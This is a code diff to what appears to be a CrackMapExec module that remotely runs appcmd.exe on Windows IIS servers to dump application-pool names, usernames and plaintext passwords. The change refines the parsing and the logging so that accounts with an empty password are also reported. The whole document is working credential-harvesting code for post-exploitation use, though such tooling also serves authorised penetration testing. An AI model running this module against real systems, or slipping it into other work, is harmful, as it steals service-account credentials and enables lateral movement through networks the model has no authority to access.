@@ -46,18 +46,15 @@ class CMEModule:
         command = f'powershell -c "C:\\windows\\system32\\inetsrv\\appcmd.exe list apppool /@t:*"'
         context.log.info(f'Checking For Hidden Credentials With Appcmd.exe')
         output = connection.execute(command, True)
-
-        # Split the output into lines
+        
         lines = output.splitlines()
-        username = ""
-        password = ""
-        apppool_name = ""
+        username = None
+        password = None
+        apppool_name = None
 
-        # Create a set to store credentials
         credentials_set = set()
 
         for line in lines:
-            # Extract APPPOOL.NAME
             if 'APPPOOL.NAME:' in line:
                 apppool_name = line.split('APPPOOL.NAME:')[1].strip().strip('"')
             if "userName:" in line:
@@ -65,19 +62,24 @@ class CMEModule:
             if "password:" in line:
                 password = line.split("password:")[1].strip().strip('"')
 
-            if username and password:
-                # Store credentials as tuple in the set
+            
+            if apppool_name and username is not None and password is not None:  
                 current_credentials = (apppool_name, username, password)
 
                 if current_credentials not in credentials_set:
                     credentials_set.add(current_credentials)
-                    context.log.success(f"Credentials Found for APPPOOL: {apppool_name}")
-                    context.log.highlight(f"Username: {username}, Password: {password}")
+                    
+                    if username:
+                        context.log.success(f"Credentials Found for APPPOOL: {apppool_name}")
+                        if password == "":
+                            context.log.highlight(f"Username: {username} - User Does Not Have A Password")
+                        else:
+                            context.log.highlight(f"Username: {username}, Password: {password}")
 
-                # Reset username, password, and apppool_name for next iteration
-                username = ""
-                password = ""
-                apppool_name = ""
+                
+                username = None
+                password = None
+                apppool_name = None
 
         if not credentials_set:
-            context.log.fail("No credentials found :( ")
+            context.log.fail("No credentials found :(")
